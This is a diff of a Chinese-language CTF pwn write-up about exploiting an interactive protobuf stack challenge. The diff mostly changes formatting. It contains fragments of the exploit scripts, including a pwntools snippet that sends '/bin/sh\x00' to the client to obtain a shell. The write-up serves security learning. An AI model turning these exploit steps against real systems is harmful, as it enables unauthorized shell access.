@@ -80,8 +80,8 @@ while True:
 - 一定要写两个 while 循环，内层的 while 对应于每次的四次交互，外层的 while 可以防止比如说 oddclient 跑挂的话，只用 gdb oddclient 就行，不用重开服务器，调试的时候省力很多 ~   
 - try-except-finally 一定要放在内层循环的外面，不然发第一遍消息之后 connection 已经被关闭了，再发消息就会报错 fd corruption 之类的奇怪错误，其实看 connection 的定义位置，应该能想到是在内层循环的外面ww ，评价是 python 没学好:（    
 ## exp
-把交互搞定之后，就变成一个基本栈题了hh ~ 其实笔者一开始 unhex 逆向有点小问题，所以也是调试了一会才搞定的hhh（exp 中可以看到痕迹）
-```python
+把交互搞定之后，就变成一个基本栈题了hh ~ 其实笔者一开始 unhex 逆向有点小问题，所以也是调试了一会才搞定的hhh（exp 中可以看到痕迹）     
+```py
 import socket
 from time import sleep
 from odd_pb2 import Message,Opcode # 生成的protobuf文件
@@ -179,8 +179,12 @@ while True:
         connection.close()
 
 ```
-此外为了发 "/bin/sh\x00" 主要是那个结尾的0,另写了一个脚本来和 oddclient 交互
-```python
+
+
+此外为了发 "/bin/sh\x00" 主要是那个结尾的0,另写了一个脚本来和 oddclient 交互    
+
+
+```py
 from pwn import*
 p=process("../oddclient")
 context(log_level="debug",arch="amd64")
@@ -193,6 +197,6 @@ sleep(0.4)
 p.sendline("/bin/sh\x00")
 p.interactive()
 ```
-原题和所有做题痕迹见 [这里](Rosayxy.github.io/attachments/pwn_client.zip)
+原题和所有做题痕迹见 [这里](/attachments/pwn_client.zip)
 ## 总结
 发现交互 pwn 题还是要多练ww，感觉写&逆向交互都不太熟练，下次争取在赛场上打出来 ~    
